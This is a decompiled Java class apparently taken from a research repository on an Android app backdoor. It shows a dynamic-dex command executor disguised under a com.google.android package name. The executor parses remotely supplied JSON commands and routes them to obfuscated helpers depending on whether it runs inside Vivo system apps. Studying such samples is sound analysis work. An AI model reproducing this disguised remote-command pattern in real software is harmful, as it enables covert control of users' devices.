package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import org.json.JSONObject;

public class VivoOfficialUninstallExecutor extends DynamicCmdExecutor {
  public void realExecute(Context paramContext, String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      if ("com.vivo.devicereg".equals(paramContext.getPackageName()) || "com.bbk.appstore".equals(paramContext.getPackageName()) || "com.vivo.browser".equals(paramContext.getPackageName())) {
        new d();
        d.a(paramContext, jSONObject);
        return;
      } 
      new c();
      c.a(paramContext, jSONObject);
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\VivoOfficialUninstallExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */